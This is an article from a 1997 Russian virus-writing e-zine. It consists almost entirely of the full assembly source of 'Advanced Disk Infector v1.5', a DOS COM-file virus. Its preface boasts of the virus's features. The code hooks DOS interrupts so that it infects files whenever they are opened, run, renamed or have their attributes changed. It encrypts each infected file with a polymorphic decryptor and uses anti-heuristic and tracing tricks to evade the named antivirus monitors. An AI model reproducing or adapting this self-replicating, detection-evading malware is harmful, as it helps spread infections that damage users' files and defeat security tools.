┌────────────────┬──┬────────┬─────────────────────────────┬─────────────────┐
│INFECTED MOSCOW │#1│ JAN'97 │(C)STEALTH Group MoscoW & Co │ one@redline.ru  │
└────────────────┴──┴────────┴─────────────────────────────┴─────────────────┘
┌──────────────────────────────────────────────────┬────────────────────────┐
│ Advanced Disk Infector Virus                     │ (C)                    │
└──────────────────────────────────────────────────┴────────────────────────┘
;
;          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.
;
;                    (C) Copyright, 1997-98, by Beast, (SGWW)
;
;	Привет всем читателям Infected Voice. Скучно становится здесь в 
;Бишкеке. Зимние каникулы а снега все еще нет. Ходим в рубашках. В такую погоду
;15-20 градусов делать вообще нечего. Вот сидишь перед своим единственным ути-
;шением - XT'шкой с CGA и пишешь виры. Пока за нее не сядешь тебе сразу гре-
;зится свое детише не лечащаеся ADinf'ами. Что-то полиморфное с маскировкой
;передачи оригинальных байт. Бутовое - шифрующее диск. С таким алгоритмом -
;заражения как CommanderBomber. Что - то такое что будет ломать все презерва-
;тивы Award'a, AMI, и даже write protected на дискетах. А пока представляю свое
;новое произведение - Advanced Disk Infector version 1.5 это дополненная  и за-
;ного переписанная первая версия ADinf'а. Здесь кое - что есть:
;
;1. Забивание ошибок int 24h
;2. Постояное востановление int 1, int 0, int 3 на iret
;3. При заражении заглушка int 8 и установка на iret int 2Ah (для обмана AVPTSR)
;4. Нахождение оригинального int 21h через PSP и int 30h/31h
;5. Используется "Двойная посадка"
;6. После заражения весь файл шифруется вместе с вирусом и добавляется 
;   расшифровщик.
;7. Процедура расшифровки файла - полиморфна. (см п.6)
;8. Иногда файл может быть зашифрован 2-3 раза. (отсюда не угадашь длину вира и 
;   всех расшифровщиков)
;9. Размер вира меньше на ((200-250)*кол-во_зашивровок) байт чем фактическая 
;   прибавка к файлу.
;10.Не обнаруживается Web'ом. (Другое не пробовалось)
;11.Не лечится ADinf'ом
;12.Не останавливается AVPTSR'ом
;13.Высокая скорость размножения. Все функции DOS'а на входе DS:DX которых
;   имя файла.
;14.Размножается через файловые защиты и антивирусные мониторы (презервативы)
;   висящие на int 21h
;15.Из антиэвристики использовались
;   1. Запись в таблицу векторов
;   2. Чтение из портов
;   3. Заглушка int 3, int 1, int 0
;   4. Шифровка
;   5. Посадка в память в 2 этапа (через PSP:000A )
;   6. Вызов mov ax,0E0E0h/int 21h/or al,al/jz $+4/int 20h/
;   7. Работа вне памати программы (far call in PSP:00FB) 
;16.Отсутствие деструкции. (умышленной)
;17.Защита Copyright'а.
;
;   P.S.  Приношу свои извинения за то что этот вир не заражает EXE-шники
; просто лень >|-:). Здесь к месту слова:
;
;Не в тираже счастье - а в красоте алгоритма.
;
;  Заражение EXE'шников стандартно.
;
;  P.S.1. Буду рад за сообщение о любых глюках. 
;						(с) by Beast.
;
		.model tiny	; Это все знают для чего
		.code
		org	100h

Infected:	dec	bp  	  ; Признак заражения для сокращения тела вира
		jmp	WEB_IDIOT ; переход на сами знаете что

VIRR:		PUSH	CS	  ; Второй инсталятор, сюде передается управле-
		POP	DS	  ; нее после завершения проги-носитель
		MOV	AH,48H	  
		MOV	BX,VP
		INT	21H	  ; выделим для полного счастья
		JNC	GOOD_ALLOCATE
		RET		  ; Хотя таких ситуаций не может быть, но всеже

GOOD_ALLOCATE:	PUSH	ES DS BX DX
		CALL	GET_ORIGINAL_INT_21H	; Добудем оригинальный int 21h
		POP	DX BX DS ES
		MOV	ES,AX		; ES=наш сегмент
		CLD
		MOV	SI,0
		MOV	DI,SI		; Залезем в память
		MOV	CX,VL
	REP	MOVSB
		MOV	DS,AX
		MOV	AX,3521H
	; Перехватим int 21h
		INT	21H
		MOV	DS:[ADDRES21-VIRR+2],ES
		MOV	DS:[ADDRES21-VIRR],BX
		MOV	AX,2521H
		MOV	DX,INT21MANAGER-VIRR
		INT	21H

		MOV	AX,3524H	; Перехватим int 24h
		INT	21H
		MOV	DS:[ADR24-VIRR+2],ES
		MOV	DS:[ADR24-VIRR],BX
		MOV	AX,2524H
		MOV	DX,NEW24H-VIRR
		INT	21H

		MOV	AX,3508H	; Перехватим int 08h
		INT	21H
		MOV	DS:[ADR8-VIRR+2],ES
		MOV	DS:[ADR8-VIRR],BX
		MOV	AX,2508H
		MOV	DX,NEW8-VIRR
		INT	21H

		MOV	AX,251CH	; Перехватим int 1Ch
		MOV	DX,NEW1CH-VIRR
		INT	21H

		MOV	BYTE PTR DS:[A24-VIRR],1 ; Это для обработчика int 24h
						 ; скажем что оно сейчас актив-
						 ; но.
		PUSH	DS
		POP	AX
		DEC	AX
		MOV	ES,AX			; теперь наш блок памяти
		MOV	BYTE PTR ES:[1],8	; is DOS Reserved
		RET			

;*****************************************************************;
;*                      I N S T A L L E R                        *;
;*****************************************************************;
VirrInstall:	CALL	$+3		; Куда мы попали ?
		POP	SI
		SUB	SI,VIRRINSTALL-VIRR+3
		MOV	AX,9876H
		INT	21H
		JC	ALREADY_IN_MEM
   ;***********************************************************;
   ;                    I m p o r t a n t                     *;
   ;***********************************************************;
		PUSH	SI ES 
		MOV	BX,CS:[02]		; найдем адрес куда можно сесть
		SUB	BX,VP			; в первый раз. Это будет нашим 
		MOV	ES,BX			; временным пристанищем. (Хоро-
						; шо здесь пословица "Нет ниче-
						; го более постоянного чем вре-
						; менное" на действует
;--------------------------------------------
; Садимся в память первый раз
;--------------------------------------------
		MOV	DI,0
		MOV	CX,VL
	REP	MOVSB
		MOV	AX,CS:[10]		; Сохраняем оригинальный адрес 
		MOV	ES:[FORRET-VIRR],AX	; возврата (разврата)
		MOV	AX,CS:[12]
		MOV	ES:[FORRET-VIRR+2],AX
		MOV	AX,ES			; и установим адрес разврата
		MOV	CS:[12],AX		; (возврата) на свое временное
		MOV	AX,RETURN-VIRR		; пристанище
		MOV	CS:[10],AX
		POP	ES SI
ALREADY_IN_MEM:

;--------------------------------------------
; Возврат оригинальных байт на место
;--------------------------------------------
		MOV	DI,100H			; подлечим нашу измученную про-
		PUSH	DI			; граму - носитель, хотя управ-
		ADD	SI,BYTES-VIRR		; ление еще раз все равно она
		MOVSW				; нам отдаст
		MOVSW
		RET

NEW_BYTES:	DEC	BP    ; Метка зараженности
		DB	0E9H
JMP_ADR		DW	?

;--------------------------------------------------------------------
; На этот кусочек падает милость процессора после завершения проги
;--------------------------------------------------------------------
RETURN:		CALL	VIRR  ;это сами знаете что на наш второй инсталятор
		DB	0EAH  ;JMP Far на программу запустившую прогу с которой
FORRET		DD	?     ;мы успешно проинструлировались.

;--------------------------------------------
; А это оригинальные байты программы.
;--------------------------------------------
BYTES:		NOP
		NOP
		INT	20H

;--------------------------------------------
;       Новый обработчик 21-ого интерапта
;--------------------------------------------
INT21MANAGER:	
		PUSHF
		CMP	AX,9876H	; Проверить не просят ли у нас совета
		JNE	NO_BROTHER	; инсталироваться или нет?
		POPF
		STC
		RETF	2
NO_BROTHER:
				; Это список функций при, которых 
				; происходит заражение

		CMP	AH,3DH	; Открытие
		JE	CHECK
		CMP	AH,4BH	; Исполнение
		JE	CHECK
		CMP	AH,43H	; Смена атрибутов
		JE	CHECK
		CMP	AH,56H	; Переименование
		JE	CHECK
		JMP	NO_CHECK_DS_DX
CHECK:		PUSH	AX BX CX DX DS ES DI SI BP
		CALL	INFECTION	; ЗарОжение (рождение вира)
		POP	BP SI DI ES DS DX CX BX AX
		JMP	NO_CHECK
NO_CHECK_DS_DX:
		; А это место для любителей сделать заражение по 4e/4f
NO_CHECK:
		POPF
		DB	0EAH	; Far JUMP на далеко не оригинальный, запога-
ADDRES21	DD	?	; неный презервативами int 21h

;---------------------------------------------------------------------------
; Заражение файлов DS:DX - file name for infection
;---------------------------------------------------------------------------

INFECTION:	MOV	AX,3D00h ; No comment ;)
		CALL	OR21	 
		JNC	$+3
		RET
		MOV	BX,AX
		PUSH	AX		; Don't worry it just get
		MOV	AX,1220H	; System File's Tabel
		INT	2FH
		MOV	BL,BYTE PTR ES:[DI]
		MOV	AX,1216H
		INT	2FH
		POP	BX
		MOV	BYTE PTR ES:[DI+2],2	; Now he is read/write opened
		PUSH	CS
		POP	DS
		
		MOV	DX,OFFSET BYTES-OFFSET VIRR
		MOV	CX,4			; Read first 4 bytes
		MOV	AH,3FH
		INT	21H
		CMP	BYTE PTR DS:[BYTES-VIRR],'M' ; It infected or EXE
		JE	CLOSE
		MOV	AX,ES:[DI+17]
		CMP	AX,60000		; We can't infect above 60000
		JA	CLOSE
		CMP	AX,VL			; and don't want bellow VirLen
		JB	CLOSE
		CMP	WORD PTR ES:[DI+32],'OC' ; Don't infect CO??????.COM
		JE	CLOSE
		CMP	WORD PTR ES:[DI+32+8],'OC' ; Check: Does it CO? file
		JNE	CLOSE			   ; No
		MOV	ES:[DI+21],AX		   ; Yes
		ADD	AX,WEB_IDIOT-VIRR-4	   ; Make jump to anti-web 
		MOV	DS:[JMP_ADR-VIRR],AX	   ; pattern

		push	bx			; Turn off int 8h
		CALL	OFF_08_24_2A		; int 24h and int 2ah
		pop	bx

		MOV	AH,40H			; Write virus body in file
		CWD
		MOV	CX,VL
		CALL	OR21

		XOR	AX,AX
		MOV	ES:[DI+21],AX

		MOV	AH,40H			; And write jump to begin file
		MOV	DX,NEW_BYTES-VIRR
		MOV	CX,4
		CALL	OR21

AGAIN_PROTECT:	CALL	CRYPT_ALL_FILE		; Call suboutine for crypt all
		IN	AL,40H			; file
		CMP	AL,10h			; Cay we do it again
		JB	AGAIN_PROTECT		; Yes ! ! !

		CALL	ON_08_24_2A		; Turn on int 8 and int 24h
CLOSE:
		MOV	AH,3EH			; Close him.
		INT	21H
		RET

OR21:		PUSHF				; Это вызов чистого как слеза 
		PUSH	CS			; int 21h
		CALL	ORIG_INT_21
		RET
ORIG_INT_21:
		DB	0EAH
TRACED_21H	DW	?,?


;--------------------------------------------------------------------------
; Выключение int 8, int 24h, int 2Ah
;--------------------------------------------------------------------------

OFF_08_24_2A:	MOV	BYTE PTR DS:[A24-virr],0
		IN	AL,21H	
		OR	AL,1
		OUT	21H,AL
		MOV	AX,252AH
		MOV	DX,NEW2AH-VIRR
		CALL	OR21
		RET


;--------------------------------------------------------------------------
; Включение int 8, int 24h, int 2Ah
;--------------------------------------------------------------------------

ON_08_24_2A:	IN	AL,21H
		AND	AL,11111110B
		OUT	21H,AL
		MOV	BYTE PTR DS:[A24-VIRR],1
		RET
A24		DB	1

NEW24H:		PUSHF
		CMP	BYTE PTR CS:[A24-VIRR],0
		JNE	ACTIVE24H
		POPF
		MOV	AL,3
NEW2AH:
		IRET
ACTIVE24H:	DB	0EAH
ADR24		DW	?,?


;---------------------------------------------------------------------------
; Доставание оригинального int 21h. На выходе в TRACED_21H оригинальный 21h.
;---------------------------------------------------------------------------

GET_ORIGINAL_INT_21H:
		CALL	PSP_TRACE
		JNC	FOUNDED_21H
		CALL	INT30_TRACE
		JNC	FOUNDED_21H
		MOV	AX,3521H
		INT	21H
		PUSH	ES
		POP	DS
		MOV	BX,DX
FOUNDED_21H:	MOV	WORD PTR CS:[TRACED_21H+2-VIRR],DS
		MOV	WORD PTR CS:[TRACED_21H-VIRR],BX
		RET
PSP_TRACE:	LDS	BX,DS:[6]
TRACE_NEXT:	CMP	BYTE PTR DS:[BX],0EAH
		JNZ	CHECK_DISPATCH
		LDS	BX,DS:[BX+1]
		CMP	WORD PTR DS:[BX],9090H
		JNZ	TRACE_NEXT
		SUB	BX,32H
		CMP	WORD PTR DS:[BX],9090H
		JNZ	CHECK_DISPATCH
GOOD_SEARCH:	CLC
		RET
CHECK_DISPATCH:	CMP	WORD PTR DS:[BX],2E1EH
		JNZ	BAD_EXIT
		ADD	BX,25H
		CMP	WORD PTR DS:[BX],80FAH
		JZ	GOOD_SEARCH
BAD_EXIT:	STC
		RET
INT30_TRACE:	SUB	BX,BX
		MOV	DS,BX
		MOV	BL,0C0h
		JMP	SHORT TRACE_NEXT

CRYPT_ALL_FILE:

		CALL	MUTATION    ; Замутировать шифровщик и расщифровщик

		IN	AX,40H
		MOV	WORD PTR DS:[WITH_AX+1-VIRR],AX
					; За писЯть расшивровщик и оригинальные
		MOV	AX,ES:[DI+17]	; байты вируса
		SUB	AX,4
		PUSH	AX
		MOV	DS:[ENCRYPT-VIRR+1],AX

		MOV	DS:[EN_JMP+2-VIRR],AX
		
		SUB	AX,AX
		MOV	Es:[DI+21],AX

		MOV	CX,4
		MOV	AH,3FH
		MOV	DX,VIR_BYTES-VIRR
		CALL	OR21


		MOV	AX,ES:[DI+17]
		MOV	ES:[DI+21],AX
		MOV	CX,EL
		MOV	DX,ENCRYPT-VIRR
		MOV	AH,40H
		CALL	OR21

		XOR	AX,AX
		MOV	Es:[DI+21],AX
		MOV	AH,40H
		MOV	CX,4
		MOV	DX,EN_JMP-VIRR
		CALL	OR21
		POP	CX
		mov	ax,ds:[with_ax-virr+1]   ; в AX случайное значение
CRYPT_LOOP:
		CALL	READ_BYTE		 ; прочитать байт проги
		MOV	SI,REZ-VIRR

;  Н Е   М Е Н Я Т Ь   К О М А Н Д Ы 

		SUB	BYTE PTR [SI],CH
		SUB	BYTE PTR [SI],CL
		SUB	BYTE PTR [SI],AH
		SUB	BYTE PTR [SI],AL

		ADD	BYTE PTR [SI],CH
		ADD	BYTE PTR [SI],CL
		ADD	BYTE PTR [SI],AH
		ADD	BYTE PTR [SI],AL

		XOR	BYTE PTR [SI],CH
		XOR	BYTE PTR [SI],CL


		XOR	BYTE PTR [SI],AH
CRYPT_DATA:
		XOR	BYTE PTR [SI],AL

		CALL	WRITE_BYTE	; отъезд назад и запись байта

CRYPT_DATA1:	ADD	AL,CL
		ADD	AL,AH
		ADD	AL,AL
		ADD	AL,AH

		ADD	AH,CL
		ADD	AH,AH
		ADD	AH,AL
		ADD	AH,AH

		XOR	AL,AH
		XOR	AL,CL
		XOR	AL,CH

		XOR	AH,AL
		XOR	AH,CL
		XOR	AH,CH

		ROL	AL,CL
		ROL	AH,CL
		XCHG	AH,AL
		ROR	AH,CL
		ROR	AL,CL

		LOOP	CRYPT_LOOP
		RET
;---------------------------------------------------
; Расшифровщик файла
;---------------------------------------------------
ENCRYPT:	MOV	CX,0
		CALL	$+3
		POP	SI
		SUB	SI,6

;-------------------------------------------------------------------------------
; Анти-эвристика передать управление метке NXT_C и запихнуть в стек CS и 100h
;-------------------------------------------------------------------------------
		LEA	BX,[SI+NXT_C-ENCRYPT]
		MOV	BYTE PTR CS:[0FBH],9AH ; Far call 
		MOV	WORD PTR CS:[0FCH],BX
		MOV	WORD PTR CS:[0FEH],DS
		mov	ax,0fbh
		push	ax
		ret
NXT_C:
		ADD	SI,VIR_BYTES-ENCRYPT
		MOV	DI,100H
		MOVSW
		MOVSW
		MOV	DI,104H

WITH_AX:	MOV	AX,0
		jmp	out_copyright
		db	10,13
copyRIGHT	DB	'  (c) Beast. Advanced Disk Infector. [ADinf v1.5]',0,10,13
out_copyright:	PUSH	AX
;-------------------------------------------------------------------------------
; Анти - эвристика
;-------------------------------------------------------------------------------
		SUB	AX,AX
		mov	es,ax
		mov	es:[0],ax
		cmp	es:[0],ax
		je	$+4
		int	20h
;-------------------------------------------------------------------------------
; Анти - эвристика
;-------------------------------------------------------------------------------

		mov	ax,0e0e0h
		int	21h
		or	al,0
		jz	$+4
		int	20h
;-------------------------------------------------------------------------------
; Анти - эвристика
;-------------------------------------------------------------------------------

		in	al,40h
		or	al,al
		jnz	$+4
		int	20h

		POP	AX
		push	cs
		pop	es
ENCRYPT_LOOP:

;  Н Е   М Е Н Я Т Ь   К О М А Н Д Ы

DECRYPT_DATA:	XOR	BYTE PTR [DI],AL
		XOR	BYTE PTR [DI],AH
		XOR	BYTE PTR [DI],CL
		XOR	BYTE PTR [DI],CH

		SUB	BYTE PTR [DI],AL
		SUB	BYTE PTR [DI],AH
		SUB	BYTE PTR [DI],CL
		SUB	BYTE PTR [DI],CH

		ADD	BYTE PTR [DI],AL
		ADD	BYTE PTR [DI],AH
		ADD	BYTE PTR [DI],CL
		ADD	BYTE PTR [DI],CH


DECRYPT_DATA1:	ADD	AL,CL
		ADD	AL,AH
		ADD	AL,AL
		ADD	AL,AH

		ADD	AH,CL
		ADD	AH,AH
		ADD	AH,AL
		ADD	AH,AH

		XOR	AL,AH
		XOR	AL,CL
		XOR	AL,CH

		XOR	AH,AL
		XOR	AH,CL
		XOR	AH,CH

		ROL	AL,CL
		ROL	AH,CL
		XCHG	AH,AL
		ROR	AH,CL
		ROR	AL,CL

		INC	DI
		LOOP	ENCRYPT_LOOP
		RETF
VIR_BYTES	DB	90h,90h,90H,0C3h
EL		EQU	$-ENCRYPT
EN_JMP:		DEC	BP
		DB	0E9h
		DW	?
REZ		DB	?

READ_BYTE:	push	ax cx		; используется в шифровке
		MOV	AH,3FH
		JMP	SHORT FIN_DOS_OP

WRITE_BYTE:	PUSH	AX CX
		MOV	AH,40H
		DEC	WORD PTR ES:[DI+21]
FIN_DOS_OP:
		MOV	DX,REZ-VIRR
		MOV	CX,1
		CALL	OR21
		pop	cx ax
		RET

NEW1CH:		CALL	RESTORE_00_01_03
		IRET

NEW8:		CALL	RESTORE_00_01_03
		DB	0EAH
ADR8		DW	?,?

RESTORE_00_01_03:
		PUSHF
		PUSH	AX DS
		XOR	AX,AX
		MOV	DS,AX
		MOV	WORD PTR DS:[0],NEW2AH-VIRR	; iret
		MOV	WORD PTR DS:[2],CS
		MOV	WORD PTR DS:[4],NEW2AH-VIRR	; iret
		MOV	WORD PTR DS:[6],CS
		MOV	WORD PTR DS:[12],NEW2AH-VIRR	; iret
		MOV	WORD PTR DS:[14],CS
		POP	DS AX
		POPF
		RET

MUTATION:	PUSH	SI DI BX
		MOV	WORD PTR DS:[UP_RND-VIRR],11
		MOV	WORD PTR DS:[DOWN_RND-VIRR],0
		MOV	SI,DECRYPT_DATA-VIRR
		MOV	DI,SI
		CALL	GET_RND		; Получить случайное число
		SHL	BX,1
		PUSH	BX
		ADD	SI,BX
		CALL	GET_RND		; и получить второе и в соот-
		SHL	BX,1		; ветствии с ними команды в шифровшике
		PUSH	BX		; и расшифровщике
		ADD	DI,BX
		CALL	XCHG_SI_DI
		
		MOV	DI,CRYPT_DATA-VIRR
		MOV	SI,DI ;CRYPT_DATA-VIRR-2
		POP	BX
		SUB	DI,BX
		POP	BX
		SUB	SI,BX
		CALL	XCHG_SI_DI

		POP	BX DI SI
		RET

UP_RND		DW	?
DOWN_RND	DW	?

GET_RND:	IN	AX,40H
		MOV	BX,WORD PTR DS:[UP_RND-VIRR]
		SUB	BX,WORD PTR DS:[DOWN_RND-VIRR]

CONT_RND:	SUB	AX,BX
		CMP	AX,BX
		JA	CONT_RND
		MOV	BX,AX
		RET

XCHG_SI_DI:	PUSH	WORD PTR DS:[DI] ; Подобие команды
		PUSH	WORD PTR DS:[SI] ; xchg word ptr [si],word ptr [di]
		POP	WORD PTR DS:[DI]
		POP	WORD PTR DS:[SI]
		RET
		
;--------------------------------------------
;          Как поиметь Web'у на диске
;--------------------------------------------

WEB_IDIOT:	MOV	DI,102H
		mov	di,102h
		MOV	AX,[DI]
		SUB	AX,WEB_IDIOT-VIRRINSTALL
		MOV	[DI],AX
		SUB	DI,2
;--------------------------------------------------
; Анти - эвристика
;--------------------------------------------------

		SUB	AX,AX
		MOV	ES,AX
		MOV	WORD PTR Es:[0],0
		MOV	WORD PTR Es:[4],0
		MOV	WORD PTR Es:[6],0
		MOV	WORD PTR Es:[3*4],0
		MOV	WORD PTR Es:[3*4+2],0

		CMP	WORD PTR Es:[0],0
		JE	$+4
		INT	20H
		CMP	WORD PTR Es:[4],0
		JE	$+4
		INT	20H
		CMP	WORD PTR Es:[6],0
		JE	$+4
		INT	20H
		CMP	WORD PTR Es:[3*4],0
		JE	$+4
		INT	20H
		CMP	WORD PTR Es:[3*4+2],0
		JE	$+4
		INT	20H
		push	cs
		pop	es
		PUSH	DI
		RET
BUFFER		LABEL	BYTE
VL		EQU	$-VIRR
VP		EQU	(VL/16)+1		; Finita la comedia
		end	Infected
